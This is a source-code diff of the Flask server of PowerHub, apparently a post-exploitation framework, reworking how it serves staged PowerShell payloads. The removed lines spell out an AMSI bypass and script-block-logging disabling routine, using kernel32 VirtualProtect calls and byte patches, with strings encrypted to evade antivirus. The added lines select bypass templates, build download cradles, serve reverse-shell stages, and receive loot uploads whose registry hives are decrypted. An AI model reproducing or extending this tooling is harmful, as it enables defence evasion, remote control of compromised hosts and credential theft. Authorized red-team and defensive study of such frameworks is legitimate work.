@@ -1,5 +1,6 @@
 
 from base64 import b64encode
+from binascii import unhexlify
 from datetime import datetime
 import logging
 import os
@@ -9,18 +10,19 @@ from tempfile import TemporaryDirectory
 from flask import Flask, render_template, request, Response, redirect, \
          send_from_directory, flash, make_response, abort, jsonify
 
+from werkzeug.exceptions import BadRequestKeyError
 from werkzeug.serving import WSGIRequestHandler, _log
 from werkzeug.middleware.proxy_fix import ProxyFix
 from flask_socketio import SocketIO  # , emit
 
 from powerhub.sql import get_clipboard, init_db, decrypt_hive, get_loot, \
-        delete_loot
-from powerhub.stager import modules, stager_str, callback_url, \
+        delete_loot, get_clip_entry_list
+from powerhub.stager import modules, build_cradle, callback_urls, \
         import_modules, webdav_url
 from powerhub.upload import save_file, get_filelist
 from powerhub.directories import UPLOAD_DIR, BASE_DIR, DB_FILENAME, \
         XDG_DATA_HOME
-from powerhub.tools import encrypt, compress, get_secret_key
+from powerhub.tools import encrypt, compress, KEY
 from powerhub.auth import requires_auth
 from powerhub.repos import repositories, install_repo
 from powerhub.obfuscation import symbol_name
@@ -50,7 +52,6 @@ except ImportError as e:
     log.exception(e)
     db = None
 cb = get_clipboard()
-KEY = get_secret_key()
 
 socketio = SocketIO(
     app,
@@ -60,9 +61,6 @@ socketio = SocketIO(
 if not args.DEBUG:
     logging.getLogger("socketio").setLevel(logging.WARN)
     logging.getLogger("engineio").setLevel(logging.WARN)
-
-need_proxy = True
-need_tlsv12 = (args.SSL_KEY is not None)
 
 
 def push_notification(type, msg, title, subtitle="", **kwargs):
@@ -106,6 +104,7 @@ def run_flask_app():
 
 @app.template_filter()
 def debug(msg):
+    """This is a function for debugging statements in jinja2 templates"""
     if args.DEBUG:
         return msg
     return ""
@@ -113,9 +112,25 @@ def debug(msg):
 
 @app.template_filter()
 def nodebug(msg):
+    """This is a function for (no) debugging statements in jinja2 templates"""
     if not args.DEBUG:
         return msg
     return ""
+
+
+@app.template_filter()
+def rc4encrypt(msg):
+    """This is a function for encrypting strings in jinja2 templates"""
+    return b64encode(encrypt(msg.encode(), KEY)).decode()
+
+
+@app.template_filter()
+def rc4byteencrypt(data):
+    """This is a function for encrypting bytes in jinja2 templates
+
+    data must be hexascii encoded.
+    """
+    return b64encode(encrypt(b64encode(unhexlify(data)), KEY)).decode()
 
 
 @app.route('/')
@@ -127,10 +142,10 @@ def index():
 @app.route('/hub')
 @requires_auth
 def hub():
+    clip_entries = get_clip_entry_list(cb)
     context = {
-        "dl_str": stager_str(need_proxy=need_proxy,
-                             need_tlsv12=need_tlsv12),
         "modules": modules,
+        "clip_entries": clip_entries,
         "repositories": list(repositories.keys()),
         "SSL": args.SSL_KEY is not None,
         "AUTH": args.AUTH,
@@ -143,9 +158,6 @@ def hub():
 @requires_auth
 def receiver():
     context = {
-        "dl_str": stager_str(flavor='reverse_shell',
-                             need_proxy=need_proxy,
-                             need_tlsv12=need_tlsv12),
         "SSL": args.SSL_KEY is not None,
         "shells": shell_receiver.active_shells(),
         "AUTH": args.AUTH,
@@ -308,55 +320,28 @@ def payload_m():
 @app.route('/0')
 def payload_0():
     """Load 0th stage"""
-    # these are possibly 'suspicious' strings to be used in the powershell
-    # payload. we don't want AV to detect them.
-    encrypted_strings = [
-        "Bypass.AMSI",
-        "System.Management.Automation.Utils",
-        "cachedGroupPolicySettings",
-        "NonPublic,Static",
-        "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
-        "EnableScriptBlockLogging",
-        "Failed to disable AMSI, aborting",
-        """ using System;
-            using System.Runtime.InteropServices;
 
-            public class Kernel32 {
-                [DllImport("kernel32")]
-                public static extern IntPtr GetProcAddress(IntPtr hModule,
-                    string lpProcName);
-
-                [DllImport("kernel32")]
-                public static extern IntPtr LoadLibrary(string lpLibFileName);
-
-                [DllImport("kernel32")]
-                public static extern bool VirtualProtect(IntPtr lpAddress,
-                                UIntPtr dwSize, uint flNewProtect,
-                                out uint lpflOldProtect);
-            }
-        """,
-        "amsi.dll",
-        b64encode(bytes([0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89,
-                  0x6B, 0x10, 0x49, 0x89, 0x73, 0x18, 0x57, 0x41, 0x56,
-                  0x41, 0x57, 0x48, 0x83, 0xEC, 0x70])).decode(),
-        b64encode(bytes([0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x18,
-                         0x53, 0x56])).decode(),
-        "DllCanUnloadNow",
-    ]
-    encrypted_strings = [b64encode(encrypt(x.encode(), KEY)).decode() for x
-                         in encrypted_strings]
     try:
         clipboard_id = int(request.args.get('e'))
         exec_clipboard_entry = cb.entries[clipboard_id].content
     except TypeError:
         exec_clipboard_entry = ""
+    amsi_bypass = request.args['a']
+    amsi_template = ""
+    # prevent path traversal
+    if not (amsi_bypass == 'none'
+            or '.' in amsi_bypass
+            or '/' in amsi_bypass
+            or '\\' in amsi_bypass):
+        amsi_template = "powershell/amsi/"+amsi_bypass+".ps1"
     context = {
         "modules": modules,
-        "callback_url": callback_url,
+        "callback_url": callback_urls[request.args['t']],
+        "transport": request.args['t'],
         "key": KEY,
-        "strings": encrypted_strings,
+        "amsibypass": amsi_template,
         "symbol_name": symbol_name,
-        "stage2": 'r' if 'r' in request.args else '1',
+        "stage2": request.args["f"],
         "exec_clipboard_entry": exec_clipboard_entry,
     }
     result = render_template(
@@ -367,9 +352,9 @@ def payload_0():
     return result
 
 
-@app.route('/1')
-def payload_1():
-    """Load 1st stage"""
+@app.route('/h')
+def payload_h():
+    """Load next stage of the Hub"""
     try:
         with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
             profile = f.read()
@@ -380,6 +365,7 @@ def payload_1():
         "webdav_url": webdav_url,
         "symbol_name": symbol_name,
         "profile": profile,
+        "transport": request.args['t'],
     }
     result = render_template(
                     "powershell/powerhub.ps1",
@@ -401,7 +387,7 @@ def hub_modules():
                     "powershell/modules.ps1",
                     **context,
     ).encode()
-    result = b64encode(encrypt(compress(result), KEY))
+    result = b64encode(encrypt((result), KEY))
     return Response(result, content_type='text/plain; charset=utf-8')
 
 
@@ -422,17 +408,18 @@ def payload_l():
 
 @app.route('/dlcradle')
 def dlcradle():
-    global need_proxy, need_tlsv12
-    need_proxy = request.args['proxy'] == 'true'
-    need_tlsv12 = request.args['tlsv12'] == 'true'
-    return stager_str(need_proxy=need_proxy, need_tlsv12=need_tlsv12)
+    try:
+        return build_cradle(request.args, flavor=request.args["flavor"])
+    except BadRequestKeyError as e:
+        log.error("Unknown key, must be one of %s" % str(request.args))
+        return (str(e), 500)
 
 
 @app.route('/u', methods=["POST"])
 def upload():
     """Upload one or more files"""
     file_list = request.files.getlist("file[]")
-    noredirect = "noredirect" in request.args
+    is_from_script = "script" in request.args
     loot = "loot" in request.args and request.args["loot"]
     for file in file_list:
         if file.filename == '':
@@ -441,16 +428,16 @@ def upload():
             if loot:
                 loot_id = request.args["loot"]
                 log.info("Loot received - %s" % loot_id)
-                save_loot(file, loot_id)
+                save_loot(file, loot_id, encrypted=is_from_script)
             else:
                 log.info("File received - %s" % file.filename)
-                save_file(file)
+                save_file(file, encrypted=is_from_script)
     if loot:
         decrypt_hive(loot_id)
         push_notification("reload", "Update Loot", "")
     else:
         push_notification("reload", "Update Fileexchange", "")
-    if noredirect:
+    if is_from_script:
         return ('OK', 200)
     else:
         return redirect('/fileexchange')
@@ -511,9 +498,12 @@ def reload_modules():
 
 @app.route('/r', methods=["GET"])
 def reverse_shell():
-    """Spawn a reverse shell"""
+    """Load next stage of the Reverse Shell"""
     context = {
-        "dl_cradle": stager_str().replace('$K', '$R'),
+        #  "dl_cradle": build_cradle(
+        #      request.args,
+        #      flavor="hub",
+        #  ).replace('$K', '$R'),
         "IP": args.URI_HOST,
         "delay": 10,  # delay in seconds
         "lifetime": 3,  # lifetime in days
